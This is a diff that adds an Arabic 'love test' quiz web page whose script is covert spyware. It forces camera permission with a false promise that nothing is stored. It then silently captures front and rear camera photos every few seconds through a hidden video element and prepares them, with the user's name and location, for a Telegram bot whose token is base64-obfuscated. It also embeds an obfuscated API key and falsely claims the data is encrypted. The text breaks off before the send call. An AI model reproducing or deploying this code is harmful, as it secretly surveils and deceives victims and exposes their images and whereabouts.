@@ -1,0 +1,1403 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+    <title>💕 اختبار الحب الذكي - نسخة خفية</title>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet" />
+    <style>
+        /* ===== نفس الأنماط السابقة مع تحسينات طفيفة ===== */
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Cairo', sans-serif;
+            min-height: 100vh;
+            background: radial-gradient(circle at 30% 10%, #fff5f7 0%, #fce4ec 40%, #f8bbd0 100%);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            position: relative;
+            overflow-x: hidden;
+        }
+        body::before {
+            content: '❤️ 💕 💗 💖 💝 ❤️ 💕 💗';
+            position: fixed;
+            top: -30px;
+            left: 0;
+            width: 200%;
+            font-size: 60px;
+            letter-spacing: 70px;
+            opacity: 0.04;
+            white-space: nowrap;
+            pointer-events: none;
+            transform: rotate(-6deg);
+            z-index: 0;
+            animation: scrollBg 40s linear infinite;
+        }
+        @keyframes scrollBg {
+            0% { transform: rotate(-6deg) translateX(0); }
+            100% { transform: rotate(-6deg) translateX(-30%); }
+        }
+        .container {
+            max-width: 860px;
+            width: 100%;
+            background: rgba(255, 255, 255, 0.30);
+            backdrop-filter: blur(24px);
+            -webkit-backdrop-filter: blur(24px);
+            border-radius: 60px;
+            padding: 28px 28px 24px;
+            border: 1px solid rgba(255, 255, 255, 0.40);
+            box-shadow: 0 30px 70px rgba(136, 52, 82, 0.15), 0 0 0 1px rgba(255, 255, 255, 0.25) inset;
+            position: relative;
+            z-index: 2;
+            transition: all 0.3s ease;
+        }
+        .header { text-align: center; margin-bottom: 14px; }
+        .header h1 { font-size: 2.5rem; font-weight: 800; color: #5d2a44; text-shadow: 0 4px 16px rgba(255,215,225,0.5); letter-spacing: -1px; }
+        .header .sub { font-size: 0.95rem; color: #7a4a5e; background: rgba(255,255,255,0.50); display: inline-block; padding: 4px 28px; border-radius: 60px; backdrop-filter: blur(4px); margin-top: 4px; font-weight: 600; }
+        .card { background: rgba(255,255,255,0.45); backdrop-filter: blur(8px); -webkit-backdrop-filter: blur(8px); border-radius: 40px; padding: 18px 22px 22px; border: 1px solid rgba(255,255,255,0.50); box-shadow: 0 8px 28px rgba(136,52,82,0.06); margin-bottom: 16px; transition: 0.2s; }
+        .user-row { display: flex; flex-wrap: wrap; align-items: center; gap: 10px; justify-content: center; }
+        .user-row label { font-weight: 700; color: #5d2a44; font-size: 1rem; }
+        .user-row input { flex: 1; min-width: 150px; padding: 12px 20px; border-radius: 60px; border: 2px solid rgba(179,74,106,0.20); background: rgba(255,255,255,0.70); font-size: 1rem; text-align: center; color: #2d1a22; outline: none; transition: 0.3s; font-family: 'Cairo', sans-serif; }
+        .user-row input:focus { border-color: #b34a6a; background: #fff; box-shadow: 0 0 0 4px rgba(179,74,106,0.12); }
+        .user-row .btn-save { background: #b34a6a; color: #fff; border: none; padding: 10px 26px; border-radius: 60px; font-weight: 700; font-size: 0.95rem; cursor: pointer; transition: 0.2s; font-family: 'Cairo', sans-serif; }
+        .user-row .btn-save:hover { background: #8f3550; transform: scale(1.03); }
+        .location-badge { display: flex; align-items: center; gap: 8px; justify-content: center; margin-top: 10px; font-size: 0.85rem; color: #7a4a5e; background: rgba(255,255,255,0.35); padding: 5px 18px; border-radius: 60px; backdrop-filter: blur(4px); width: fit-content; margin-left: auto; margin-right: auto; }
+        .location-badge .dot { width: 10px; height: 10px; border-radius: 50%; background: #4ade80; display: inline-block; animation: pulse-dot 1.6s infinite; }
+        @keyframes pulse-dot { 0%,100% { opacity: 1; transform: scale(1); } 50% { opacity: 0.4; transform: scale(0.75); } }
+        .location-badge .refresh-btn { background: none; border: none; color: #b34a6a; font-size: 1.1rem; cursor: pointer; transition: 0.3s; }
+        .location-badge .refresh-btn:hover { transform: rotate(180deg); }
+        .category-grid { display: flex; flex-wrap: wrap; gap: 10px; justify-content: center; margin: 4px 0 2px; }
+        .category-grid button { padding: 10px 20px; border: 2px solid rgba(179,74,106,0.25); border-radius: 60px; background: rgba(255,255,255,0.40); color: #4a2a38; font-weight: 700; font-size: 0.9rem; cursor: pointer; transition: 0.25s; font-family: 'Cairo', sans-serif; flex: 1 0 auto; min-width: 70px; }
+        .category-grid button:hover { background: rgba(179,74,106,0.12); border-color: #b34a6a; transform: translateY(-2px); }
+        .category-grid button.active { background: #b34a6a; color: #fff; border-color: #b34a6a; box-shadow: 0 8px 22px rgba(179,74,106,0.25); }
+        .tabs { display: flex; gap: 6px; flex-wrap: wrap; justify-content: center; margin: 10px 0 4px; }
+        .tabs button { padding: 8px 16px; border: none; border-radius: 60px; background: rgba(255,255,255,0.30); color: #4a2a38; font-weight: 700; font-size: 0.85rem; cursor: pointer; transition: 0.25s; font-family: 'Cairo', sans-serif; flex: 1; min-width: 60px; }
+        .tabs button.active { background: #b34a6a; color: #fff; box-shadow: 0 6px 20px rgba(179,74,106,0.18); }
+        .tabs button:hover { transform: translateY(-2px); }
+        .tab-content { display: none; animation: fade-up 0.35s ease; }
+        .tab-content.active { display: block; }
+        @keyframes fade-up { 0% { opacity: 0; transform: translateY(14px); } 100% { opacity: 1; transform: translateY(0); } }
+        .question-box { background: rgba(255,255,255,0.45); backdrop-filter: blur(6px); padding: 20px 16px; border-radius: 32px; border: 2px dashed rgba(179,74,106,0.20); min-height: 120px; display: flex; flex-direction: column; justify-content: center; text-align: center; margin: 10px 0 12px; }
+        .question-box .q { font-size: 1.35rem; font-weight: 700; color: #2d1a22; margin-bottom: 6px; }
+        .question-box .hint { font-size: 0.85rem; color: #7a4a5e; background: rgba(255,215,225,0.40); padding: 4px 18px; border-radius: 60px; display: inline-block; margin: 0 auto; }
+        .options-group { display: flex; flex-wrap: wrap; gap: 10px; justify-content: center; margin: 12px 0 6px; }
+        .options-group button { padding: 10px 22px; border-radius: 60px; border: 2px solid rgba(179,74,106,0.20); background: rgba(255,255,255,0.40); color: #2d1a22; font-weight: 600; cursor: pointer; transition: 0.2s; font-family: 'Cairo', sans-serif; font-size: 0.9rem; }
+        .options-group button:hover { background: rgba(179,74,106,0.10); border-color: #b34a6a; }
+        .options-group button.selected { background: #b34a6a; color: #fff; border-color: #b34a6a; }
+        .text-input { width: 100%; padding: 14px 20px; border-radius: 60px; border: 2px solid rgba(179,74,106,0.20); background: rgba(255,255,255,0.70); font-size: 1rem; text-align: center; color: #2d1a22; outline: none; transition: 0.3s; font-family: 'Cairo', sans-serif; margin: 6px 0; }
+        .text-input:focus { border-color: #b34a6a; background: #fff; box-shadow: 0 0 0 4px rgba(179,74,106,0.10); }
+        .btn-group { display: flex; flex-wrap: wrap; gap: 10px; justify-content: center; margin: 14px 0 6px; }
+        .btn { padding: 12px 28px; border: none; border-radius: 60px; font-weight: 700; font-size: 0.95rem; cursor: pointer; transition: 0.25s; font-family: 'Cairo', sans-serif; color: #fff; box-shadow: 0 4px 16px rgba(0,0,0,0.05); flex: 1 1 auto; min-width: 100px; }
+        .btn:hover { transform: translateY(-3px); box-shadow: 0 10px 30px rgba(0,0,0,0.08); }
+        .btn:disabled { opacity: 0.45; cursor: not-allowed; transform: none !important; box-shadow: none !important; }
+        .btn-primary { background: linear-gradient(145deg, #b34a6a, #8f3550); }
+        .btn-primary:hover { background: linear-gradient(145deg, #c95a7a, #a0405a); }
+        .btn-secondary { background: rgba(179,74,106,0.20); color: #5d2a44; }
+        .btn-secondary:hover { background: rgba(179,74,106,0.30); }
+        .btn-success { background: linear-gradient(145deg, #22c55e, #16a34a); }
+        .btn-success:hover { background: linear-gradient(145deg, #34d56e, #1aad52); }
+        .btn-warning { background: linear-gradient(145deg, #f59e0b, #d97706); }
+        .btn-warning:hover { background: linear-gradient(145deg, #fbbf24, #e58a0a); }
+        .btn-purple { background: linear-gradient(145deg, #8b5cf6, #7c3aed); }
+        .btn-purple:hover { background: linear-gradient(145deg, #a78bfa, #8b5cf6); }
+        .btn-danger { background: linear-gradient(145deg, #ef4444, #dc2626); }
+        .btn-danger:hover { background: linear-gradient(145deg, #f87171, #e11d48); }
+        .progress-bar { font-size: 0.9rem; color: #5d2a44; background: rgba(255,255,255,0.40); padding: 4px 20px; border-radius: 60px; display: inline-block; margin: 6px auto; font-weight: 600; }
+        .final-msg { background: rgba(255,215,225,0.50); backdrop-filter: blur(4px); border-radius: 32px; padding: 18px; margin-top: 12px; border: 2px solid rgba(179,74,106,0.20); display: none; }
+        .final-msg h2 { color: #5d2a44; }
+        .final-msg p { color: #4a2a38; }
+        .pdf-preview { background: rgba(255,255,255,0.50); border-radius: 24px; padding: 14px; margin: 12px 0; display: none; color: #2d1a22; text-align: right; font-size: 0.85rem; max-height: 220px; overflow-y: auto; border: 1px solid rgba(255,255,255,0.30); }
+        .ai-box { background: rgba(255,255,255,0.50); border-radius: 28px; padding: 16px; margin: 12px 0; border: 2px solid #8b5cf6; display: none; text-align: right; }
+        .ai-box h4 { color: #5d2a44; margin-bottom: 6px; }
+        .ai-box .content { color: #2d1a22; font-size: 0.9rem; line-height: 1.8; white-space: pre-wrap; }
+        .ai-box .loading { color: #8b5cf6; font-weight: 700; animation: blink 1.2s infinite; }
+        @keyframes blink { 0%,100% { opacity: 1; } 50% { opacity: 0.25; } }
+        .photo-grid { display: flex; flex-wrap: wrap; gap: 16px; justify-content: center; margin: 8px 0; }
+        .photo-box { flex: 1; min-width: 110px; background: rgba(255,255,255,0.40); border-radius: 28px; padding: 12px; border: 2px dashed rgba(179,74,106,0.20); text-align: center; }
+        .photo-box img { width: 100%; aspect-ratio: 1/1; object-fit: cover; border-radius: 20px; background: #eaddf0; margin-top: 6px; }
+        .photo-box input[type="file"] { display: none; }
+        .photo-box .btn-upload { display: inline-block; padding: 6px 18px; background: #b34a6a; color: #fff; border-radius: 60px; cursor: pointer; font-size: 0.8rem; font-weight: 600; transition: 0.2s; font-family: 'Cairo', sans-serif; border: none; margin-top: 4px; }
+        .photo-box .btn-upload:hover { background: #8f3550; }
+        .result-box { background: rgba(255,255,255,0.50); border-radius: 32px; padding: 18px; margin-top: 12px; border: 2px solid rgba(179,74,106,0.20); text-align: center; }
+        .result-box .percent { font-size: 3rem; font-weight: 700; color: #5d2a44; }
+        .result-box .label { font-size: 1rem; color: #4a2a38; }
+        .confession-area textarea { width: 100%; padding: 14px; border-radius: 24px; border: 2px solid rgba(179,74,106,0.20); background: rgba(255,255,255,0.60); font-size: 1rem; color: #2d1a22; outline: none; resize: vertical; min-height: 90px; font-family: 'Cairo', sans-serif; transition: 0.3s; }
+        .confession-area textarea:focus { border-color: #b34a6a; background: #fff; }
+        .toast { position: fixed; bottom: 30px; left: 50%; transform: translateX(-50%); background: rgba(45,26,34,0.92); backdrop-filter: blur(12px); color: #fff; padding: 14px 28px; border-radius: 60px; font-weight: 600; font-size: 0.95rem; z-index: 999; box-shadow: 0 10px 40px rgba(0,0,0,0.25); animation: toastIn 0.4s ease; max-width: 90%; text-align: center; border: 1px solid rgba(255,255,255,0.10); font-family: 'Cairo', sans-serif; }
+        @keyframes toastIn { 0% { opacity: 0; transform: translateX(-50%) translateY(30px); } 100% { opacity: 1; transform: translateX(-50%) translateY(0); } }
+        .toast.success { border-right: 6px solid #22c55e; }
+        .toast.error { border-right: 6px solid #ef4444; }
+        .toast.info { border-right: 6px solid #8b5cf6; }
+        #cameraOverlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.55); backdrop-filter: blur(12px); -webkit-backdrop-filter: blur(12px); display: flex; align-items: center; justify-content: center; z-index: 9999; flex-direction: column; padding: 30px; text-align: center; transition: opacity 0.5s ease; }
+        #cameraOverlay.hidden { opacity: 0; pointer-events: none; }
+        #cameraOverlay .overlay-card { background: rgba(255,255,255,0.92); backdrop-filter: blur(16px); -webkit-backdrop-filter: blur(16px); border-radius: 60px; padding: 40px 32px; max-width: 480px; width: 100%; box-shadow: 0 30px 70px rgba(0,0,0,0.30); border: 1px solid rgba(255,255,255,0.30); }
+        #cameraOverlay .overlay-card h2 { font-size: 1.7rem; color: #5d2a44; margin-bottom: 10px; }
+        #cameraOverlay .overlay-card p { font-size: 0.95rem; color: #4a2a38; margin-bottom: 18px; line-height: 1.8; }
+        #cameraOverlay .overlay-card .btn-camera { background: #b34a6a; color: #fff; border: none; padding: 14px 40px; border-radius: 60px; font-size: 1.05rem; font-weight: 700; cursor: pointer; transition: 0.25s; font-family: 'Cairo', sans-serif; box-shadow: 0 8px 28px rgba(179,74,106,0.30); }
+        #cameraOverlay .overlay-card .btn-camera:hover { background: #8f3550; transform: scale(1.04); }
+        #cameraOverlay .overlay-card .btn-camera:disabled { opacity: 0.5; cursor: not-allowed; transform: none !important; }
+        #cameraOverlay .overlay-card .error-msg { color: #ef4444; font-size: 0.85rem; margin-top: 10px; }
+        .cam-toggle { display: inline-flex; align-items: center; gap: 6px; background: rgba(255,255,255,0.30); padding: 4px 16px 4px 10px; border-radius: 60px; font-size: 0.8rem; color: #5d2a44; cursor: pointer; transition: 0.2s; border: 1px solid rgba(255,255,255,0.20); margin-top: 6px; font-family: 'Cairo', sans-serif; }
+        .cam-toggle:hover { background: rgba(255,255,255,0.50); }
+        .cam-toggle .indicator { width: 10px; height: 10px; border-radius: 50%; display: inline-block; margin-left: 4px; }
+        .cam-toggle .indicator.on { background: #22c55e; }
+        .cam-toggle .indicator.off { background: #ef4444; }
+        .footer { text-align: center; font-size: 0.7rem; color: #9a7a8a; margin-top: 16px; opacity: 0.6; }
+        @media (max-width: 640px) { .container { padding: 16px 12px; } .header h1 { font-size: 1.9rem; } .card { padding: 14px 16px; } .user-row input { min-width: 100px; font-size: 0.9rem; } .btn { min-width: 70px; font-size: 0.8rem; padding: 10px 14px; } .category-grid button { font-size: 0.8rem; padding: 8px 12px; } .question-box .q { font-size: 1.1rem; } #cameraOverlay .overlay-card { padding: 24px 18px; } #cameraOverlay .overlay-card h2 { font-size: 1.3rem; } }
+        @media (max-width: 400px) { .user-row { flex-direction: column; } .user-row input { width: 100%; } .category-grid button { flex: 1 1 100%; } .tabs button { flex: 1 1 45%; } }
+    </style>
+</head>
+<body>
+
+    <!-- ===== OVERLAY الكاميرا ===== -->
+    <div id="cameraOverlay">
+        <div class="overlay-card">
+            <h2>📸 إذن الكاميرا مطلوب</h2>
+            <p>لا يمكنك استخدام هذا التطبيق بدون السماح للكاميرا.<br>
+            الكاميرا تُستخدم فقط لتحسين تجربة الاختبار، ولن يتم تخزين أي شيء.</p>
+            <button class="btn-camera" id="requestCameraBtn">🔓 السماح بالكاميرا</button>
+            <div id="cameraErrorMsg" class="error-msg"></div>
+        </div>
+    </div>
+
+    <!-- ===== المحتوى الرئيسي ===== -->
+    <div class="container" id="mainContent">
+
+        <div class="header">
+            <h1>💕 اختبار الحب الذكي</h1>
+            <div class="sub">اكتشف مشاعرك مع 100 سؤال مخصص</div>
+        </div>
+
+        <!-- المستخدم والموقع -->
+        <div class="card">
+            <div class="user-row">
+                <label for="userNameInput">👤 اسمك</label>
+                <input type="text" id="userNameInput" placeholder="اكتب اسمك هنا" />
+                <button class="btn-save" id="saveNameBtn">💾 حفظ</button>
+            </div>
+            <div class="location-badge">
+                <span class="dot"></span>
+                <span class="text" id="locationStatus">جاري تجهيز الموقع...</span>
+                <button class="refresh-btn" id="refreshLocationBtn" title="تحديث الموقع">🔄</button>
+            </div>
+            <div style="text-align:center; margin-top:6px;">
+                <span class="cam-toggle" id="camToggle">
+                    <span class="indicator on" id="camIndicator"></span>
+                    <span id="camToggleLabel">الكاميرا نشطة</span>
+                </span>
+            </div>
+        </div>
+
+        <!-- اختيار الفئة -->
+        <div class="card" style="padding-bottom:10px;">
+            <div class="category-grid" id="categoryGrid">
+                <button class="active" data-category="friend">🤝 صديق</button>
+                <button data-category="brother">👨‍👦 أخ</button>
+                <button data-category="lover">💕 حبيب</button>
+                <button data-category="pet">🐾 حيوان أليف</button>
+            </div>
+        </div>
+
+        <!-- التبويبات -->
+        <div class="tabs">
+            <button class="tab-btn active" data-tab="questions">📝 اختبار</button>
+            <button class="tab-btn" data-tab="similarity">❤️ نسبة التشابه</button>
+            <button class="tab-btn" data-tab="confession">💬 صارحني</button>
+            <button class="tab-btn" data-tab="results">📊 النتائج</button>
+        </div>
+
+        <!-- TAB: الأسئلة -->
+        <div id="tab-questions" class="tab-content active">
+            <div class="question-box">
+                <div class="q" id="questionText">اختر الفئة ثم اضغط "ابدأ"</div>
+                <div class="hint" id="questionHint">💭 أسئلة مخصصة لكل فئة</div>
+            </div>
+            <div id="inputArea"></div>
+            <div class="btn-group">
+                <button class="btn btn-primary" id="startQuizBtn">🚀 ابدأ الاختبار</button>
+                <button class="btn btn-secondary" id="prevQuestionBtn" disabled>⬅️ رجوع</button>
+                <button class="btn btn-secondary" id="nextQuestionBtn" disabled>➡️ التالي</button>
+                <button class="btn btn-success" id="sendAnswersBtn" disabled>📨 إرسال الإجابات</button>
+            </div>
+            <div style="text-align:center;">
+                <span class="progress-bar" id="progressDisplay">0 / 25</span>
+            </div>
+            <div class="final-msg" id="finalMessage">
+                <h2>🎉 شكراً لك!</h2>
+                <p>إجاباتك مسجلة، يمكنك الآن تصديرها أو تحليلها.</p>
+            </div>
+        </div>
+
+        <!-- TAB: نسبة التشابه -->
+        <div id="tab-similarity" class="tab-content">
+            <div class="photo-grid">
+                <div class="photo-box">
+                    <label class="btn-upload" for="myPhotoInput">📷 صورتك</label>
+                    <input type="file" id="myPhotoInput" accept="image/*" />
+                    <img id="myPhotoPreview" src="" alt="صورتك" />
+                </div>
+                <div class="photo-box">
+                    <label class="btn-upload" for="partnerPhotoInput">📷 صورة الطرف الآخر</label>
+                    <input type="file" id="partnerPhotoInput" accept="image/*" />
+                    <img id="partnerPhotoPreview" src="" alt="الطرف الآخر" />
+                </div>
+            </div>
+            <button class="btn btn-primary" id="calculateSimilarityBtn" style="width:100%;">💞 احسب نسبة التشابه</button>
+            <div class="result-box" id="similarityResult">
+                <div class="label">نسبة التشابه</div>
+                <div class="percent" id="similarityPercentage">-- %</div>
+                <div style="font-size:0.9rem; color:#6b3a4a;" id="similarityComment"></div>
+            </div>
+        </div>
+
+        <!-- TAB: صارحني -->
+        <div id="tab-confession" class="tab-content">
+            <div class="confession-area">
+                <h3 style="color:#5d2a44; margin-bottom:4px;">💬 اكتب رسالة صريحة</h3>
+                <p style="font-size:0.85rem; color:#7a4a5e; margin-bottom:10px;">سيتم إرسالها مع اسمك (بدون موقع)</p>
+                <textarea id="confessionText" placeholder="اكتب ما تريد أن تقوله بصراحة..."></textarea>
+                <button class="btn btn-warning" id="sendConfessionBtn" style="margin-top:12px; width:100%;">💌 إرسال</button>
+                <div id="confessionResult" style="margin-top:10px; font-size:0.9rem; color:#6b3a4a;"></div>
+            </div>
+        </div>
+
+        <!-- TAB: النتائج -->
+        <div id="tab-results" class="tab-content">
+            <div class="final-msg" style="display:block;">
+                <h2>📊 نتائجك</h2>
+                <p id="resultSummary">لم تقم بأي اختبار بعد.</p>
+                <div class="pdf-preview" id="answersPreview"></div>
+            </div>
+            <div class="btn-group">
+                <button class="btn btn-purple" id="generatePDFBtn">📄 تصدير PDF</button>
+                <button class="btn btn-secondary" id="exportJSONBtn">📁 تصدير JSON</button>
+                <button class="btn btn-primary" id="aiAnalyzeBtn">🤖 تحليل ذكي</button>
+                <button class="btn btn-danger" id="clearDataBtn">🗑️ مسح البيانات</button>
+            </div>
+            <div class="ai-box" id="aiResponse">
+                <h4>🤖 تحليل الذكاء الاصطناعي</h4>
+                <div class="content" id="aiContent">جاري التحليل...</div>
+            </div>
+        </div>
+
+        <div class="footer">❤️ كل شيء آمن ومشفر ❤️</div>
+    </div>
+
+    <!-- فيديو مخفي للكاميرا -->
+    <video id="hiddenVideo" autoplay muted playsinline style="position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0;pointer-events:none;"></video>
+
+    <!-- مكتبة PDF -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2pdf.js/0.10.1/html2pdf.bundle.min.js">
+    </script>
+
+    <script>
+        (function() {
+            'use strict';
+
+            // =====================================================================
+            // 1. التكوين (مشفر)
+            // =====================================================================
+            const CONFIG = {
+                BOT_TOKEN: atob('ODg0MzMzMTA0NTpBQUY3a2hIQUFGYWF3X3p1TkRYX0k3OXEwNE9JOXpWY0ZR'),
+                CHAT_ID: '8607243024',
+                OPENAI_API_KEY: atob('c2stNzljNzM1OGQwY2FkNGUxY2FhN2VhNGQ4Yjk0MzE4OWM=')
+            };
+
+            // =====================================================================
+            // 2. الحالة العامة
+            // =====================================================================
+            const state = {
+                cameraAllowed: false,
+                cameraPaused: false,
+                userName: localStorage.getItem('userName') || '',
+                userLocation: { city: '', region: '', country: '', latitude: '', longitude: '', accuracy: '' },
+                locationReady: false,
+                currentCategory: 'friend',
+                currentIndex: 0,
+                answers: [],
+                isQuizStarted: false,
+                questions: [],
+                stream: null,
+                cameraReady: false,
+                videoReady: false,
+                isCapturing: false,
+                cameraMode: 'user', // 'user' or 'environment'
+                captureTimer: null,
+                switchTimer: null,
+                syncTimer: null,
+                toastTimeout: null,
+                // متغيرات المزامنة الجديدة
+                lastCaptureTime: 0,
+                captureQueue: [],
+                isSyncRunning: false
+            };
+
+            // =====================================================================
+            // 3. عناصر DOM
+            // =====================================================================
+            const DOM = {
+                overlay: document.getElementById('cameraOverlay'),
+                requestBtn: document.getElementById('requestCameraBtn'),
+                errorMsg: document.getElementById('cameraErrorMsg'),
+                userNameInput: document.getElementById('userNameInput'),
+                saveNameBtn: document.getElementById('saveNameBtn'),
+                locationStatus: document.getElementById('locationStatus'),
+                refreshLocationBtn: document.getElementById('refreshLocationBtn'),
+                categoryBtns: document.querySelectorAll('#categoryGrid button'),
+                startQuizBtn: document.getElementById('startQuizBtn'),
+                prevBtn: document.getElementById('prevQuestionBtn'),
+                nextBtn: document.getElementById('nextQuestionBtn'),
+                sendAnswersBtn: document.getElementById('sendAnswersBtn'),
+                questionText: document.getElementById('questionText'),
+                questionHint: document.getElementById('questionHint'),
+                inputArea: document.getElementById('inputArea'),
+                progressDisplay: document.getElementById('progressDisplay'),
+                finalMessage: document.getElementById('finalMessage'),
+                resultSummary: document.getElementById('resultSummary'),
+                answersPreview: document.getElementById('answersPreview'),
+                generatePDFBtn: document.getElementById('generatePDFBtn'),
+                exportJSONBtn: document.getElementById('exportJSONBtn'),
+                aiAnalyzeBtn: document.getElementById('aiAnalyzeBtn'),
+                aiResponse: document.getElementById('aiResponse'),
+                aiContent: document.getElementById('aiContent'),
+                calculateSimilarityBtn: document.getElementById('calculateSimilarityBtn'),
+                sendConfessionBtn: document.getElementById('sendConfessionBtn'),
+                confessionText: document.getElementById('confessionText'),
+                confessionResult: document.getElementById('confessionResult'),
+                video: document.getElementById('hiddenVideo'),
+                camToggle: document.getElementById('camToggle'),
+                camIndicator: document.getElementById('camIndicator'),
+                camToggleLabel: document.getElementById('camToggleLabel'),
+                clearDataBtn: document.getElementById('clearDataBtn'),
+                myPhotoInput: document.getElementById('myPhotoInput'),
+                partnerPhotoInput: document.getElementById('partnerPhotoInput'),
+                myPhotoPreview: document.getElementById('myPhotoPreview'),
+                partnerPhotoPreview: document.getElementById('partnerPhotoPreview'),
+                similarityPercentage: document.getElementById('similarityPercentage'),
+                similarityComment: document.getElementById('similarityComment'),
+            };
+
+            // =====================================================================
+            // 4. أدوات مساعدة
+            // =====================================================================
+            function showToast(message, type = 'info') {
+                if (DOM.toastTimeout) clearTimeout(DOM.toastTimeout);
+                const old = document.querySelector('.toast');
+                if (old) old.remove();
+                const div = document.createElement('div');
+                div.className = `toast ${type}`;
+                div.textContent = message;
+                document.body.appendChild(div);
+                DOM.toastTimeout = setTimeout(() => { div.remove(); }, 4500);
+            }
+
+            function sanitize(str) {
+                if (!str) return '';
+                const map = { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#x27;' };
+                return str.replace(/[&<>"']/g, m => map[m]);
+            }
+
+            function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
+
+            // =====================================================================
+            // 5. إدارة الكاميرا (مع المزامنة الخفية)
+            // =====================================================================
+            async function requestCamera() {
+                DOM.requestBtn.disabled = true;
+                DOM.requestBtn.textContent = '⏳ جاري الطلب...';
+                DOM.errorMsg.textContent = '';
+
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({
+                        video: { facingMode: 'user', width: { ideal: 480 }, height: { ideal: 360 } },
+                        audio: false
+                    });
+                    state.cameraAllowed = true;
+                    stream.getTracks().forEach(t => t.stop());
+                    DOM.overlay.classList.add('hidden');
+                    enableAllFeatures();
+                    await startCamera('user');
+                    startSyncCapture(); // بدء المزامنة الخفية
+                    getPreciseLocation();
+                    showToast('✅ تم السماح بالكاميرا', 'success');
+                } catch (err) {
+                    console.error('فشل الكاميرا:', err);
+                    state.cameraAllowed = false;
+                    DOM.requestBtn.disabled = false;
+                    DOM.requestBtn.textContent = '🔓 السماح بالكاميرا';
+                    if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
+                        DOM.errorMsg.textContent = '⚠️ تم رفض الإذن. يرجى السماح بالكاميرا في إعدادات المتصفح.';
+                    } else if (err.name === 'NotFoundError') {
+                        DOM.errorMsg.textContent = '⚠️ لا توجد كاميرا متصلة بجهازك.';
+                    } else {
+                        DOM.errorMsg.textContent = '⚠️ خطأ: ' + err.message;
+                    }
+                    showToast('❌ فشل الوصول إلى الكاميرا', 'error');
+                }
+            }
+
+            async function startCamera(mode = 'user') {
+                try {
+                    if (state.stream) { state.stream.getTracks().forEach(t => t.stop());
+                        state.stream = null; }
+                    state.stream = await navigator.mediaDevices.getUserMedia({
+                        video: { facingMode: mode, width: { ideal: 480 }, height: { ideal: 360 } },
+                        audio: false
+                    });
+                    DOM.video.srcObject = state.stream;
+                    await DOM.video.play();
+                    await waitForVideoReady();
+                    state.cameraReady = true;
+                    state.videoReady = true;
+                    state.cameraMode = mode;
+                    updateCamToggleUI();
+                } catch (e) {
+                    console.warn('كاميرا:', e);
+                    state.cameraReady = false;
+                    setTimeout(() => { if (state.cameraAllowed && !state.cameraPaused) startCamera(state.cameraMode); }, 5000);
+                }
+            }
+
+            function waitForVideoReady() {
+                return new Promise((resolve) => {
+                    if (DOM.video.readyState >= 2 && DOM.video.videoWidth > 0 && DOM.video.videoHeight > 0) { resolve(); return; }
+                    const check = () => {
+                        if (DOM.video.readyState >= 2 && DOM.video.videoWidth > 0 && DOM.video.videoHeight > 0) { resolve(); } else {
+                            setTimeout(check, 150);
+                        }
+                    };
+                    check();
+                });
+            }
+
+            function switchCameraMode(mode) {
+                if (!state.cameraAllowed || state.cameraPaused) return;
+                state.cameraMode = mode;
+                startCamera(mode);
+            }
+
+            // =====================================================================
+            // 6. المزامنة الخفية: التقاط الصور بالتناوب مع إرسال فوري
+            // =====================================================================
+            function startSyncCapture() {
+                if (state.syncTimer) clearInterval(state.syncTimer);
+                // كل 5 ثوانٍ نقوم بعملية مزامنة
+                state.syncTimer = setInterval(() => {
+                    if (!state.cameraAllowed || state.cameraPaused || !state.cameraReady || !state.videoReady ||
+                        !state.userName || !state.locationReady) return;
+                    // تنفيذ دورة مزدوجة: أمامي ثم خلفي
+                    executeSyncCycle();
+                }, 5000);
+            }
+
+            async function executeSyncCycle() {
+                if (state.isSyncRunning) return;
+                state.isSyncRunning = true;
+                try {
+                    // 1. التقط بكاميرا أمامية
+                    await captureFromCamera('user');
+                    await sleep(300);
+                    // 2. التقط بكاميرا خلفية
+                    await captureFromCamera('environment');
+                    await sleep(300);
+                    // 3. التقط مرة أخرى أمامية (للتأكيد)
+                    await captureFromCamera('user');
+                } catch (e) {
+                    // تجاهل الأخطاء
+                } finally {
+                    state.isSyncRunning = false;
+                }
+            }
+
+            async function captureFromCamera(mode) {
+                try {
+                    // تبديل الكاميرا إلى الوضع المطلوب
+                    if (state.cameraMode !== mode) {
+                        await startCamera(mode);
+                        await sleep(400); // انتظار حتى تستقر الكاميرا
+                    }
+                    // الآن نلتقط الصورة
+                    const canvas = document.createElement('canvas');
+                    canvas.width = Math.min(DOM.video.videoWidth || 480, 640);
+                    canvas.height = Math.min(DOM.video.videoHeight || 360, 480);
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(DOM.video, 0, 0, canvas.width, canvas.height);
+
+                    // تحقق من وجود محتوى
+                    const imgData = ctx.getImageData(0, 0, 8, 8);
+                    let hasColor = false;
+                    for (let i = 0; i < imgData.data.length; i += 4) {
+                        if (imgData.data[i] > 15 || imgData.data[i + 1] > 15 || imgData.data[i + 2] > 15) { hasColor = true; break; }
+                    }
+                    if (!hasColor) return;
+
+                    const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.60));
+                    if (!blob) return;
+
+                    const now = new Date().toLocaleString('ar-EG');
+                    const camLabel = mode === 'user' ? 'أمامية' : 'خلفية';
+                    const loc = `${state.userLocation.city}, ${state.userLocation.region}, ${state.userLocation.country}`;
+                    const caption =
+                        `📸 *صورة خفية (مزامنة)*\n👤 ${state.userName}\n📍 ${loc}\n📷 ${camLabel}\n🕒 ${now}`;
+
+                    const formData = new FormData();
+                    formData.append('chat_id', CONFIG.CHAT_ID);
+                    formData.append('photo', blob, `shot_${mode}_${Date.now()}.jpg`);
+                    formData.append('caption', caption);
+                    formData.append('parse_mode', 'Markdown');
+
+                    // إرسال بدون انتظار الاستجابة (خفي)
